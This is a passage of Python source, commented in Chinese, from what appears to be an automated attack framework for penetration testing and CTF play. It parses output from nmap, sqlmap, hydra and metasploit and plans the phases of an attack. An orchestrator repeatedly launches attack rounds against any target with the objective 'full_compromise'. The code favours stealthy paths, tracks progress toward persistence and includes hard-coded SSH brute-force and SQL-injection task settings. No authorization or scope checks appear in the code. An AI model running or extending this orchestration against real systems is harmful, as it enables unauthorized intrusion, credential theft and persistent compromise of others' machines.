        if not terminal_commands and not log_only_commands:
            return "# 没有需要在终端直接执行的简单命令"

        return "\n".join(summary_parts)

    def _save_pocs(self, session_data: Dict[str, Any], pocs: Dict[str, str]):
        """保存生成的PoC文件"""
        session_id = session_data.get("session_id", "unknown")
        target = session_data.get("target", "unknown").replace(":", "_").replace("/", "_")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        for format_type, content in pocs.items():
            if format_type == "error":
                continue

            # 确定文件扩展名
            extensions = {
                "python": ".py",
                "bash": ".sh",
                "ctf_solver": ".py",
                "markdown": ".md"
            }

            extension = extensions.get(format_type, ".txt")
            filename = f"{self.poc_dir}/poc_{session_id}_{target}_{timestamp}_{format_type}{extension}"

            with open(filename, 'w', encoding='utf-8') as f:
                f.write(content)

            logger.info(f"PoC saved: {filename}")

# ==================== PoC生成API端点 ====================

class ResultAnalyzer:
    """结果分析器 - 解析攻击向量的执行结果"""

    def __init__(self):
        self.parsers = {
            "nmap": self._parse_nmap_result,
            "sqlmap": self._parse_sqlmap_result,
            "hydra": self._parse_hydra_result,
            "gobuster": self._parse_gobuster_result,
            "nuclei": self._parse_nuclei_result,
            "metasploit": self._parse_metasploit_result,
        }

    def analyze_result(self, vector_id: str, tool_name: str, output: str,
                      success: bool) -> AttackResult:
        """分析攻击结果"""
        result = AttackResult(
            vector_id=vector_id,
            success=success,
            output=output
        )

        if success and tool_name in self.parsers:
            try:
                self.parsers[tool_name](output, result)
            except Exception as e:
                logger.warning(f"Failed to parse {tool_name} result: {e}")

        return result

    def _parse_nmap_result(self, output: str, result: AttackResult):
        """解析nmap扫描结果"""
        discovered_ports = []
        discovered_services = []

        # 解析开放端口
        port_pattern = r"(\d+)/(tcp|udp)\s+open\s+(\w+)"
        for match in re.finditer(port_pattern, output):
            port, protocol, service = match.groups()
            discovered_ports.append({
                "port": int(port),
                "protocol": protocol,
                "service": service
            })
            discovered_services.append(service)

        # 解析操作系统信息
        os_pattern = r"OS details: (.+)"
        os_match = re.search(os_pattern, output)
        if os_match:
            result.discovered_info["os_info"] = os_match.group(1)

        result.discovered_info["ports"] = discovered_ports
        result.discovered_info["services"] = discovered_services

        # 根据发现的服务添加能力
        if "ssh" in discovered_services:
            result.gained_capabilities.append("ssh_access_possible")
        if "http" in discovered_services or "https" in discovered_services:
            result.gained_capabilities.append("web_access_possible")
        if "smb" in discovered_services:
            result.gained_capabilities.append("smb_access_possible")

    def _parse_sqlmap_result(self, output: str, result: AttackResult):
        """解析sqlmap结果"""
        if "sqlmap identified the following injection point" in output:
            result.discovered_info["sql_injection_found"] = True
            result.gained_capabilities.append("database_access")

        # 解析数据库信息
        db_pattern = r"back-end DBMS: (.+)"
        db_match = re.search(db_pattern, output)
        if db_match:
            result.discovered_info["database_type"] = db_match.group(1)

        # 检查是否获得了shell
        if "os-shell" in output or "sql-shell" in output:
            result.gained_capabilities.append("sql_shell_access")

    def _parse_hydra_result(self, output: str, result: AttackResult):
        """解析hydra暴力破解结果"""
        # 解析成功的凭据
        cred_pattern = r"login:\s*(\S+)\s+password:\s*(\S+)"
        credentials = []

        for match in re.finditer(cred_pattern, output):
            username, password = match.groups()
            credentials.append({
                "username": username,
                "password": password,
                "service": "ssh"  # 默认SSH，可以根据具体情况调整
            })

        if credentials:
            result.discovered_info["credentials"] = credentials
            result.gained_capabilities.append("valid_credentials")

    def _parse_gobuster_result(self, output: str, result: AttackResult):
        """解析gobuster目录扫描结果"""
        directories = []
        files = []

        # 解析发现的目录和文件
        path_pattern = r"/.+\s+\(Status: (\d+)\)"
        for match in re.finditer(path_pattern, output):
            path = match.group(0).split()[0]
            status = match.group(1)

            if path.endswith('/'):
                directories.append({"path": path, "status": status})
            else:
                files.append({"path": path, "status": status})

        result.discovered_info["directories"] = directories
        result.discovered_info["files"] = files

        # 检查是否发现了敏感路径
        sensitive_paths = ["/admin", "/login", "/upload", "/config"]
        for path_info in directories + files:
            if any(sensitive in path_info["path"] for sensitive in sensitive_paths):
                result.gained_capabilities.append("sensitive_paths_found")
                break

    def _parse_nuclei_result(self, output: str, result: AttackResult):
        """解析nuclei漏洞扫描结果"""
        vulnerabilities = []

        # 解析发现的漏洞
        vuln_pattern = r"\[(.+?)\] \[(.+?)\] (.+)"
        for match in re.finditer(vuln_pattern, output):
            severity, template, target = match.groups()
            vulnerabilities.append({
                "severity": severity,
                "template": template,
                "target": target
            })

        result.discovered_info["vulnerabilities"] = vulnerabilities

        if vulnerabilities:
            result.gained_capabilities.append("vulnerabilities_identified")

    def _parse_metasploit_result(self, output: str, result: AttackResult):
        """解析metasploit结果"""
        if "Meterpreter session" in output:
            result.gained_capabilities.append("meterpreter_session")
            result.discovered_info["session_type"] = "meterpreter"

        if "Command shell session" in output:
            result.gained_capabilities.append("command_shell")
            result.discovered_info["session_type"] = "shell"

        # 解析权限级别
        if "SYSTEM" in output or "root" in output:
            result.gained_capabilities.append("admin_access")
        elif "user" in output.lower():
            result.gained_capabilities.append("user_access")


class AdaptivePathPlanner:
    """自适应路径规划器 - 基于攻击状态动态调整攻击路径"""

    def __init__(self, knowledge_graph: 'APTKnowledgeGraph'):
        self.knowledge_graph = knowledge_graph

    def update_attack_state(self, state: AttackState, results: List[AttackResult]):
        """更新攻击状态"""
        for result in results:
            # 更新完成的攻击向量
            if result.success:
                state.completed_vectors.append(result.vector_id)
                # 合并发现的信息
                for key, value in result.discovered_info.items():
                    if key in state.discovered_info:
                        if isinstance(value, list):
                            state.discovered_info[key].extend(value)
                        elif isinstance(value, dict):
                            state.discovered_info[key].update(value)
                        else:
                            state.discovered_info[key] = value
                    else:
                        state.discovered_info[key] = value

                # 添加新能力
                state.current_capabilities.extend(result.gained_capabilities)

                # 更新凭据
                if "credentials" in result.discovered_info:
                    state.available_credentials.extend(result.discovered_info["credentials"])
            else:
                state.failed_vectors.append(result.vector_id)

        # 更新攻击阶段
        state.attack_phase = self._determine_current_phase(state)
        state.last_updated = datetime.now()

    def _determine_current_phase(self, state: AttackState) -> str:
        """根据当前状态确定攻击阶段"""
        capabilities = set(state.current_capabilities)

        if "admin_access" in capabilities or "meterpreter_session" in capabilities:
            return "persistence"
        elif "user_access" in capabilities or "command_shell" in capabilities:
            return "privilege_escalation"
        elif "sql_shell_access" in capabilities or "webshell_uploaded" in capabilities:
            return "execution"
        elif "database_access" in capabilities or "valid_credentials" in capabilities:
            return "initial_access"
        elif "vulnerabilities_identified" in capabilities or "sensitive_paths_found" in capabilities:
            return "initial_access"
        elif "web_access_possible" in capabilities or "ssh_access_possible" in capabilities:
            return "reconnaissance"
        else:
            return "reconnaissance"

    def generate_next_attack_paths(self, state: AttackState,
                                  max_paths: int = 3) -> List[AttackPath]:
        """基于当前状态生成下一步攻击路径"""
        # 获取可用的攻击向量
        available_vectors = self._get_available_vectors(state)

        if not available_vectors:
            return []

        # 生成攻击路径
        paths = []

        # 路径1: 基于当前阶段的最优路径
        current_phase_vectors = [v for v in available_vectors
                               if v.phase.value == state.attack_phase]
        if current_phase_vectors:
            path = self._create_attack_path(
                f"当前阶段最优路径 ({state.attack_phase})",
                current_phase_vectors[:5],  # 限制为5个攻击向量
                state
            )
            paths.append(path)

        # 路径2: 高成功率路径
        high_success_vectors = sorted(available_vectors,
                                    key=lambda x: x.success_rate, reverse=True)[:5]
        if high_success_vectors:
            path = self._create_attack_path(
                "高成功率攻击路径",
                high_success_vectors,
                state
            )
            paths.append(path)

        # 路径3: 高隐蔽性路径
        stealth_vectors = sorted(available_vectors,
                               key=lambda x: x.stealth_level, reverse=True)[:5]
        if stealth_vectors:
            path = self._create_attack_path(
                "高隐蔽性攻击路径",
                stealth_vectors,
                state
            )
            paths.append(path)

        return paths[:max_paths]

    def _get_available_vectors(self, state: AttackState) -> List[AttackVector]:
        """获取当前状态下可用的攻击向量"""
        available = []
        capabilities = set(state.current_capabilities)

        for vector in self.knowledge_graph.attack_vectors.values():
            # 跳过已完成或失败的攻击向量
            if vector.id in state.completed_vectors or vector.id in state.failed_vectors:
                continue

            # 检查前置条件
            if self._check_prerequisites(vector, state, capabilities):
                available.append(vector)

        return available

    def _check_prerequisites(self, vector: AttackVector, state: AttackState,
                           capabilities: set) -> bool:
        """检查攻击向量的前置条件是否满足"""
        if not vector.prerequisites:
            return True

        for prereq in vector.prerequisites:
            if prereq in capabilities:
                continue
            elif prereq in state.discovered_info:
                continue
            elif prereq == "web_service_discovered" and "web_access_possible" in capabilities:
                continue
            elif prereq == "ssh_service_discovered" and "ssh_access_possible" in capabilities:
                continue
            elif prereq == "smb_service_discovered" and "smb_access_possible" in capabilities:
                continue
            elif prereq == "system_access" and ("user_access" in capabilities or "admin_access" in capabilities):
                continue
            else:
                return False

        return True

    def _create_attack_path(self, name: str, vectors: List[AttackVector],
                          state: AttackState) -> AttackPath:
        """创建攻击路径"""
        # 计算并发执行层
        dependencies = self.knowledge_graph._calculate_dependencies(vectors)
        concurrent_layers = self.knowledge_graph._optimize_attack_sequence(vectors, dependencies)

        # 计算路径指标
        success_probability = sum(v.success_rate for v in vectors) / len(vectors) if vectors else 0
        stealth_score = sum(v.stealth_level for v in vectors) / len(vectors) if vectors else 0
        estimated_time = len(concurrent_layers) * 30  # 每层预计30分钟

        # 生成路径ID
        path_id = f"adaptive_path_{state.target}_{len(state.completed_vectors)}"

        return AttackPath(
            id=path_id,
            name=name,
            target=state.target,
            vectors=vectors,
            dependencies=dependencies,
            estimated_time=estimated_time,
            stealth_score=stealth_score,
            success_probability=success_probability,
            concurrent_layers=concurrent_layers
        )


# ==================== CTF Flag识别系统 ====================

class CTFFlagDetector:
    """CTF Flag检测器 - 自动识别和提取Flag"""

    def __init__(self):
        # Flag格式正则表达式
        self.flag_patterns = {
            "ctf_format": r"CTF\{[^}]+\}",
            "flag_format": r"flag\{[^}]+\}",
            "FLAG_format": r"FLAG\{[^}]+\}",
            "custom_braces": r"[a-zA-Z0-9_]+\{[^}]+\}",
            "md5_hash": r"\b[a-f0-9]{32}\b",
            "sha1_hash": r"\b[a-f0-9]{40}\b",
            "sha256_hash": r"\b[a-f0-9]{64}\b",
            "uuid_format": r"\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b",
            "base64_flag": r"[A-Za-z0-9+/]{20,}={0,2}",
            "hex_flag": r"0x[a-fA-F0-9]{16,}",
        }

        # 假Flag过滤器（常见的示例Flag）
        self.false_positives = {
            "CTF{example}",
            "CTF{sample}",
            "CTF{test}",
            "CTF{demo}",
            "flag{example}",
            "flag{sample}",
            "flag{test}",
            "FLAG{EXAMPLE}",
            "00000000000000000000000000000000",  # 空MD5
            "da39a3ee5e6b4b0d3255bfef95601890afd80709",  # 空SHA1
        }

    def detect_flags(self, text: str, source: str = "unknown") -> List[CTFFlag]:
        """从文本中检测Flag"""
        flags = []

        for format_name, pattern in self.flag_patterns.items():
            matches = re.finditer(pattern, text, re.IGNORECASE)

            for match in matches:
                flag_content = match.group(0)

                # 过滤假Flag
                if flag_content.lower() in [fp.lower() for fp in self.false_positives]:
                    continue

                # 计算置信度
                confidence = self._calculate_confidence(flag_content, format_name, text)

                if confidence > 0.3:  # 只保留置信度较高的Flag
                    flag = CTFFlag(
                        content=flag_content,
                        format_type=format_name,
                        source=source,
                        confidence=confidence
                    )
                    flags.append(flag)

        return self._deduplicate_flags(flags)

    def _calculate_confidence(self, flag_content: str, format_type: str, context: str) -> float:
        """计算Flag的置信度"""
        confidence = 0.5  # 基础置信度

        # 根据格式类型调整置信度
        if format_type in ["ctf_format", "flag_format", "FLAG_format"]:
            confidence += 0.4  # 标准CTF格式置信度高
        elif format_type == "custom_braces":
            confidence += 0.2  # 自定义格式置信度中等
        elif format_type in ["md5_hash", "sha1_hash", "sha256_hash"]:
            confidence += 0.1  # 哈希格式需要更多验证

        # 根据内容特征调整置信度
        if len(flag_content) > 10:
            confidence += 0.1
        if any(char.isdigit() for char in flag_content):
            confidence += 0.1
        if any(char.isupper() for char in flag_content):
            confidence += 0.1

        # 根据上下文调整置信度
        context_lower = context.lower()
        if "flag" in context_lower:
            confidence += 0.2
        if "ctf" in context_lower:
            confidence += 0.2
        if "congratulations" in context_lower or "success" in context_lower:
            confidence += 0.3

        return min(confidence, 1.0)

    def _deduplicate_flags(self, flags: List[CTFFlag]) -> List[CTFFlag]:
        """去重Flag列表"""
        seen = set()
        unique_flags = []

        for flag in flags:
            if flag.content not in seen:
                seen.add(flag.content)
                unique_flags.append(flag)

        return unique_flags


class CTFChallengeManager:
    """CTF题目管理器"""

    def __init__(self):
        self.challenges: Dict[str, CTFChallenge] = {}
        self.current_session: Optional[CTFSession] = None
        self.flag_detector = CTFFlagDetector()

    def create_session(self, name: str, team_name: str = "") -> str:
        """创建CTF竞赛会话"""
        session_id = str(uuid.uuid4())
        self.current_session = CTFSession(
            session_id=session_id,
            name=name,
            start_time=datetime.now(),
            team_name=team_name
        )
        return session_id

    def add_challenge(self, name: str, category: str, port: int, service: str) -> str:
        """添加CTF题目"""
        challenge = CTFChallenge(
            name=name,
            category=category,
            port=port,
            service=service
        )

        self.challenges[name] = challenge
        if self.current_session:
            self.current_session.challenges[name] = challenge

        return name

    def process_tool_output(self, tool_name: str, output: str, challenge_name: str = "") -> List[CTFFlag]:
        """处理工具输出，自动提取Flag"""
        flags = self.flag_detector.detect_flags(output, tool_name)

        # 如果指定了题目名称，将Flag关联到题目
        if challenge_name and challenge_name in self.challenges:
            challenge = self.challenges[challenge_name]
            challenge.flags.extend(flags)

            # 如果发现了Flag，更新题目状态
            if flags:
                challenge.status = "solved"
                challenge.solve_time = datetime.now()

        return flags


class AdaptiveAttackOrchestrator:
    """自适应攻击编排器 - 协调整个动态攻击过程"""

    def __init__(self, task_manager: 'ConcurrentTaskManager'):
        self.task_manager = task_manager
        self.result_analyzer = ResultAnalyzer()
        self.path_planner = AdaptivePathPlanner(task_manager.apt_knowledge_graph)
        self.active_attacks: Dict[str, AttackState] = {}
        self._lock = threading.Lock()

    def start_adaptive_attack(self, target: str, target_info: Dict[str, Any] = None,
                            attack_objective: str = "full_compromise") -> str:
        """启动自适应攻击"""
        attack_id = str(uuid.uuid4())

        # 初始化攻击状态
        state = AttackState(target=target)
        if target_info:
            state.discovered_info.update(target_info)
            # 根据目标信息设置初始能力
            if "ports" in target_info:
                for port_info in target_info["ports"]:
                    service = port_info.get("service", "")
                    if service in ["http", "https"]:
                        state.current_capabilities.append("web_access_possible")
                    elif service == "ssh":
                        state.current_capabilities.append("ssh_access_possible")
                    elif service == "smb":
                        state.current_capabilities.append("smb_access_possible")

        with self._lock:
            self.active_attacks[attack_id] = state

        # 启动第一轮攻击
        self._execute_attack_round(attack_id)

        return attack_id

    def _execute_attack_round(self, attack_id: str):
        """执行一轮攻击"""
        with self._lock:
            state = self.active_attacks.get(attack_id)
            if not state:
                return

        # 生成下一步攻击路径
        paths = self.path_planner.generate_next_attack_paths(state)

        if not paths:
            logger.info(f"Attack {attack_id}: No more available attack paths")
            return

        # 选择最优路径
        best_path = paths[0]
        logger.info(f"Attack {attack_id}: Executing path '{best_path.name}' with {len(best_path.vectors)} vectors")

        # 提交攻击任务
        workflow_tasks = []
        for vector in best_path.vectors:
            for tool in vector.tools:
                task_config = self.task_manager._create_apt_task_config(
                    vector, tool, state.target, 0
                )
                task_config["metadata"]["attack_id"] = attack_id
                task_config["metadata"]["vector_id"] = vector.id
                workflow_tasks.append(task_config)

        # 提交工作流
        workflow_id = self.task_manager.submit_apt_attack_chain(
            state.target, state.discovered_info, "adaptive_attack"
        )

        # 设置回调来处理结果
        self._schedule_result_processing(attack_id, workflow_id, best_path.vectors)

    def _schedule_result_processing(self, attack_id: str, workflow_id: str,
                                  vectors: List[AttackVector]):
        """安排结果处理"""
        def process_results():
            time.sleep(60)  # 等待攻击完成
            self._process_attack_results(attack_id, workflow_id, vectors)

        threading.Thread(target=process_results, daemon=True).start()

    def _process_attack_results(self, attack_id: str, workflow_id: str,
                              vectors: List[AttackVector]):
        """处理攻击结果并规划下一步"""
        try:
            # 获取工作流状态
            workflow_status = self.task_manager.get_workflow_status(workflow_id)

            if not workflow_status.get("success"):
                logger.warning(f"Attack {attack_id}: Failed to get workflow status")
                return

            # 分析结果
            results = []
            for task_id in workflow_status.get("task_ids", []):
                task_result = self.task_manager.get_task_status(task_id)
                if task_result.get("success"):
                    # 解析任务结果
                    vector_id = task_result.get("metadata", {}).get("vector_id")
                    tool_name = task_result.get("tool_name", "")
                    output = task_result.get("output", "")
                    success = task_result.get("status") == "completed"

                    if vector_id:
                        result = self.result_analyzer.analyze_result(
                            vector_id, tool_name, output, success
                        )
                        results.append(result)

            # 更新攻击状态
            with self._lock:
                state = self.active_attacks.get(attack_id)
                if state:
                    self.path_planner.update_attack_state(state, results)

                    # 记录这轮攻击的结果
                    logger.info(f"Attack {attack_id}: Round completed. "
                              f"Successful vectors: {len([r for r in results if r.success])}, "
                              f"Failed vectors: {len([r for r in results if not r.success])}")

                    # 如果还有可用路径，继续下一轮攻击
                    if len(state.completed_vectors) < 20:  # 限制最大攻击轮数
                        self._execute_attack_round(attack_id)
                    else:
                        logger.info(f"Attack {attack_id}: Maximum rounds reached")

        except Exception as e:
            logger.error(f"Attack {attack_id}: Error processing results: {e}")

    def get_attack_status(self, attack_id: str) -> Dict[str, Any]:
        """获取攻击状态"""
        with self._lock:
            state = self.active_attacks.get(attack_id)
            if not state:
                return {"error": "Attack not found"}

            return {
                "attack_id": attack_id,
                "target": state.target,
                "current_phase": state.attack_phase,
                "completed_vectors": len(state.completed_vectors),
                "failed_vectors": len(state.failed_vectors),
                "current_capabilities": state.current_capabilities,
                "discovered_info": state.discovered_info,
                "last_updated": state.last_updated.isoformat()
            }

class ConcurrentTaskManager:
    """并发任务管理器 - 支持多工具并发执行、任务依赖和智能工作流"""
    
    def __init__(self, max_workers: int = 10):
        self.max_workers = max_workers
        self._executor = ThreadPoolExecutor(max_workers=max_workers)
        self._tasks: Dict[str, ConcurrentTask] = {}
        self._task_results: Dict[str, TaskResult] = {}
        self._task_futures: Dict[str, Future] = {}
        self._dependencies: Dict[str, List[TaskDependency]] = defaultdict(list)
        self._dependents: Dict[str, Set[str]] = defaultdict(set)
        self._workflows: Dict[str, Dict[str, Any]] = {}
        self._lock = threading.Lock()

        # APT攻击知识图谱
        self.apt_knowledge_graph = APTKnowledgeGraph()

        # 自适应攻击编排器
        self.adaptive_orchestrator = AdaptiveAttackOrchestrator(self)

        # CTF题目管理器
        self.ctf_manager = CTFChallengeManager()

        # CTF模式标志
        self.ctf_mode = False

        # 任务队列（按优先级）
        self._task_queues = {
            TaskPriority.URGENT: queue.Queue(),
            TaskPriority.HIGH: queue.Queue(),
            TaskPriority.NORMAL: queue.Queue(),
            TaskPriority.LOW: queue.Queue()
        }
        
        # 统计信息
        self._stats = {
            "total_tasks": 0,
            "completed_tasks": 0,
            "failed_tasks": 0,
            "running_tasks": 0,
            "cancelled_tasks": 0
        }
        
        # 启动任务调度器
        self._running = True
        self._scheduler_thread = threading.Thread(target=self._scheduler_loop, daemon=True)
        self._scheduler_thread.start()
        logger.info("Concurrent Task Manager initialized")
    
    def submit_task(self, tool_name: str, parameters: Dict[str, Any], 
                   priority: TaskPriority = TaskPriority.NORMAL,
                   timeout: Optional[int] = None,
                   dependencies: Optional[List[TaskDependency]] = None,
                   tags: Optional[Set[str]] = None,
                   metadata: Optional[Dict[str, Any]] = None) -> str:
        """提交单个任务"""
        
        task_id = str(uuid.uuid4())
        task = ConcurrentTask(
            task_id=task_id,
            tool_name=tool_name,
            parameters=parameters,
            priority=priority,
            timeout=timeout,
            dependencies=dependencies or [],
            tags=tags or set(),
            metadata=metadata or {}
        )
        
        with self._lock:
            self._tasks[task_id] = task
            self._stats["total_tasks"] += 1
            
            # 设置依赖关系
            for dep in task.dependencies:
                self._dependencies[task_id].append(dep)
                self._dependents[dep.task_id].add(task_id)
        
        # 检查依赖并加入队列
        if self._check_dependencies_satisfied(task_id):
            self._task_queues[priority].put(task)
            logger.info(f"Task {task_id} ({tool_name}) submitted and queued")
        else:
            logger.info(f"Task {task_id} ({tool_name}) submitted, waiting for dependencies")
        
        return task_id
    
    def submit_workflow(self, workflow_name: str, target: str, 
                       workflow_type: str = "comprehensive_web_scan") -> str:
        """提交预定义工作流"""
        
        workflow_id = str(uuid.uuid4())
        
        with self._lock:
            self._workflows[workflow_id] = {
                "name": workflow_name,
                "target": target,
                "type": workflow_type,
                "status": "running",
                "tasks": [],
                "created_at": datetime.now(),
                "completed_tasks": 0,
                "total_tasks": 0
            }
        
        # 根据工作流类型创建任务
        task_configs = self._create_workflow_tasks(workflow_type, target, workflow_id)
        
        task_ids = []
        for config in task_configs:
            task_id = self.submit_task(**config)
            task_ids.append(task_id)
        
        with self._lock:
            self._workflows[workflow_id]["tasks"] = task_ids
            self._workflows[workflow_id]["total_tasks"] = len(task_ids)
        
        logger.info(f"Workflow {workflow_id} ({workflow_name}) submitted with {len(task_ids)} tasks")
        return workflow_id
    
    def _create_workflow_tasks(self, workflow_type: str, target: str, workflow_id: str) -> List[Dict[str, Any]]:
        """根据工作流类型创建任务配置"""
        
        base_metadata = {"workflow_id": workflow_id, "target": target}
        
        if workflow_type == "comprehensive_web_scan":
            return [
                {
                    "tool_name": "whatweb",
                    "parameters": {"target": target, "aggression": "1"},
                    "priority": TaskPriority.HIGH,
                    "timeout": 60,
                    "tags": {"info_gathering", "web_scan"},
                    "metadata": {**base_metadata, "phase": "tech_detection"}
                },
                {
                    "tool_name": "gobuster",
                    "parameters": {
                        "url": target,
                        "mode": "dir",
                        "wordlist": "/usr/share/wordlists/dirb/common.txt"
                    },
                    "priority": TaskPriority.NORMAL,
                    "timeout": 300,
                    "tags": {"directory_scan", "web_scan"},
                    "metadata": {**base_metadata, "phase": "directory_discovery"}
                },
                {
                    "tool_name": "nikto",
                    "parameters": {"target": target},
                    "priority": TaskPriority.NORMAL,
                    "timeout": 600,
                    "tags": {"vulnerability_scan", "web_scan"},
                    "metadata": {**base_metadata, "phase": "vulnerability_scan"}
                },
                {
                    "tool_name": "nuclei",
                    "parameters": {
                        "target": target,
                        "templates": "http/",
                        "severity": "critical,high,medium"
                    },
                    "priority": TaskPriority.HIGH,
                    "timeout": 900,
                    "tags": {"vulnerability_scan", "web_scan"},
                    "metadata": {**base_metadata, "phase": "nuclei_scan"}
                }
            ]
        
        elif workflow_type == "network_penetration_test":
            return [
                {
                    "tool_name": "nmap",
                    "parameters": {
                        "target": target,
                        "scan_type": "-sS",
                        "ports": "1-1000",
                        "additional_args": "-T4 --open"
                    },
                    "priority": TaskPriority.HIGH,
                    "timeout": 300,
                    "tags": {"port_scan", "network_scan"},
                    "metadata": {**base_metadata, "phase": "port_discovery"}
                },
                {
                    "tool_name": "nuclei",
                    "parameters": {
                        "target": target,
                        "templates": "network/",
                        "severity": "critical,high"
                    },
                    "priority": TaskPriority.HIGH,
                    "timeout": 900,
                    "tags": {"vulnerability_scan", "network_scan"},
                    "metadata": {**base_metadata, "phase": "vulnerability_scan"}
                }
            ]
        
        elif workflow_type == "fast_reconnaissance":
            return [
                {
                    "tool_name": "masscan",
                    "parameters": {
                        "target": target,
                        "ports": "80,443,22,21,25,53,110,143,993,995,8080,8443",
                        "rate": "10000"
                    },
                    "priority": TaskPriority.URGENT,
                    "timeout": 120,
                    "tags": {"fast_scan", "port_discovery"},
                    "metadata": {**base_metadata, "phase": "fast_port_scan"}
                },
                {
                    "tool_name": "subfinder",
                    "parameters": {"domain": target},
                    "priority": TaskPriority.HIGH,
                    "timeout": 180,
                    "tags": {"subdomain_enum", "reconnaissance"},
                    "metadata": {**base_metadata, "phase": "subdomain_discovery"}
                }
            ]
        
        return []

    def submit_apt_attack_chain(self, target: str, target_info: Dict[str, Any] = None,
                               attack_objective: str = "full_compromise") -> str:
        """提交APT攻击链工作流"""

        workflow_id = str(uuid.uuid4())

        # 如果没有提供目标信息，先进行侦察
        if not target_info:
            # 执行基础侦察获取目标信息
            recon_tasks = self._create_reconnaissance_tasks(target)
            for task_config in recon_tasks:
                task_id = self.submit_task(**task_config)
                # 等待侦察任务完成以获取目标信息

            # 这里应该从侦察结果中提取目标信息
            # 简化处理，假设基本的端口信息
            target_info = {
                "ip": target,
                "ports": [
                    {"port": 80, "service": "http"},
                    {"port": 443, "service": "https"},
                    {"port": 22, "service": "ssh"}
                ]
            }

        # 识别攻击面
        attack_surfaces = self.apt_knowledge_graph.identify_attack_surfaces(target_info)

        # 生成攻击路径
        attack_paths = self.apt_knowledge_graph.generate_attack_paths(target, attack_surfaces)

        if not attack_paths:
            logger.warning(f"No attack paths found for target {target}")
            return workflow_id

        # 选择最优攻击路径（这里选择成功概率最高的）
        best_path = max(attack_paths, key=lambda p: p.success_probability)

        logger.info(f"Selected APT attack path: {best_path.name}")
        logger.info(f"Attack phases: {len(best_path.concurrent_layers)} concurrent layers")
        logger.info(f"Success probability: {best_path.success_probability:.2f}")
        logger.info(f"Stealth score: {best_path.stealth_score:.2f}")

        # 创建工作流
        workflow_tasks = []
        layer_dependencies = []

        for layer_idx, layer in enumerate(best_path.concurrent_layers):
            layer_task_ids = []

            for vector_id in layer:
                vector = self.apt_knowledge_graph.attack_vectors[vector_id]

                # 为每个攻击向量创建任务
                for tool in vector.tools:
                    task_config = self._create_apt_task_config(
                        vector, tool, target, layer_idx
                    )

                    # 生成任务ID
                    task_id = str(uuid.uuid4())
                    task_config["task_id"] = task_id

                    # 添加层级依赖
                    if layer_idx > 0:
                        task_config["dependencies"] = [
                            TaskDependency(dep_task_id, "completion")
                            for dep_task_id in layer_dependencies[-1]
                        ]

                    workflow_tasks.append(task_config)
                    layer_task_ids.append(task_id)

            layer_dependencies.append(layer_task_ids)

        # 提交所有任务
        submitted_task_ids = []
        for task_config in workflow_tasks:
            # 移除task_id，因为submit_task会自动生成
            config_copy = task_config.copy()
            config_copy.pop('task_id', None)
            task_id = self.submit_task(**config_copy)
            submitted_task_ids.append(task_id)

        # 记录工作流
        self._workflows[workflow_id] = {
            "workflow_id": workflow_id,
            "workflow_name": f"APT Attack Chain - {best_path.name}",
            "target": target,
            "attack_path": best_path,
            "task_ids": submitted_task_ids,
            "created_at": datetime.now(),
            "status": "running",
            "metadata": {
                "attack_surfaces": [s.value for s in attack_surfaces],
                "attack_objective": attack_objective,
                "estimated_time": best_path.estimated_time,
                "stealth_score": best_path.stealth_score,
                "success_probability": best_path.success_probability
            }
        }

        logger.info(f"APT attack chain workflow {workflow_id} submitted with {len(submitted_task_ids)} tasks")
        return workflow_id

    def _create_reconnaissance_tasks(self, target: str) -> List[Dict[str, Any]]:
        """创建侦察阶段任务"""
        return [
            {
                "tool_name": "nmap",
                "parameters": {
                    "target": target,
                    "scan_type": "-sS -sV",
                    "ports": "1-1000"
                },
                "priority": TaskPriority.URGENT,
                "timeout": 300,
                "tags": {"reconnaissance", "port_scan"},
                "metadata": {"phase": "reconnaissance", "apt_stage": "initial_recon"}
            }
        ]

    def _create_apt_task_config(self, vector: AttackVector, tool: str,
                               target: str, layer_idx: int) -> Dict[str, Any]:
        """为APT攻击向量创建任务配置"""
        # 根据攻击向量和工具生成参数
        parameters = {"target": target}

        if tool == "sqlmap" and vector.id == "sql_injection":
            parameters.update({
                "url": f"http://{target}",
                "data": "",
                "additional_args": "--batch --level=3"
            })
        elif tool == "hydra" and vector.id == "ssh_bruteforce":
            parameters.update({
                "service": "ssh",
                "username": "admin",
                "password_file": "/usr/share/wordlists/rockyou.txt",
                "additional_args": "-t 4"
            })
        elif tool in ["gobuster", "dirb", "ffuf"] and vector.id == "directory_traversal":
            parameters.update({
                "url": f"http://{target}",
                "wordlist": "/usr/share/wordlists/dirb/common.txt"
            })
        elif tool in ["nmap", "masscan"] and vector.id == "port_scanning":
            parameters.update({
                "scan_type": "-sS -sV",
                "ports": "1-65535" if tool == "nmap" else "80,443,22,21,25,53"
            })

        return {
            "tool_name": tool,
            "parameters": parameters,
            "priority": TaskPriority.HIGH if vector.impact_level >= 7 else TaskPriority.NORMAL,
            "timeout": 600,
            "tags": {
                "apt_attack",
                vector.phase.value,
                vector.surface.value,
                f"layer_{layer_idx}"
            },
            "metadata": {
                "attack_vector_id": vector.id,
                "attack_vector_name": vector.name,
                "mitre_technique": vector.mitre_technique,
                "stealth_level": vector.stealth_level,
                "impact_level": vector.impact_level,
                "success_rate": vector.success_rate,
                "apt_layer": layer_idx
            }
        }

    def _scheduler_loop(self):
        """任务调度循环"""
        while self._running:
            try:
                task = None
                
                # 按优先级获取任务
                for priority in [TaskPriority.URGENT, TaskPriority.HIGH, 
                               TaskPriority.NORMAL, TaskPriority.LOW]:
                    try:
                        task = self._task_queues[priority].get_nowait()
                        break
                    except queue.Empty:
                        continue
                
                if task is None:
                    time.sleep(0.1)
                    continue
                
                # 检查是否可以执行（资源限制）
                with self._lock:
                    if self._stats["running_tasks"] >= self.max_workers:
                        # 重新入队
                        self._task_queues[task.priority].put(task)
                        time.sleep(0.5)
                        continue
                    
                    self._stats["running_tasks"] += 1
                
                # 提交执行
                future = self._executor.submit(self._execute_task, task)
                self._task_futures[task.task_id] = future
                
                # 设置完成回调
                future.add_done_callback(lambda f, t=task: self._on_task_completed(t, f))
                
                logger.info(f"Task {task.task_id} ({task.tool_name}) started")
                
            except Exception as e:
                logger.error(f"Error in scheduler loop: {str(e)}")
                time.sleep(1.0)
    
    def _execute_task(self, task: ConcurrentTask) -> TaskResult:
        """执行单个任务"""
        start_time = datetime.now()
        
        try:
            logger.info(f"Executing task {task.task_id}: {task.tool_name}")
            
            # 直接调用现有的execute_command函数
            if task.tool_name == "nmap":
                result = self._call_nmap(task.parameters)
            elif task.tool_name == "gobuster":
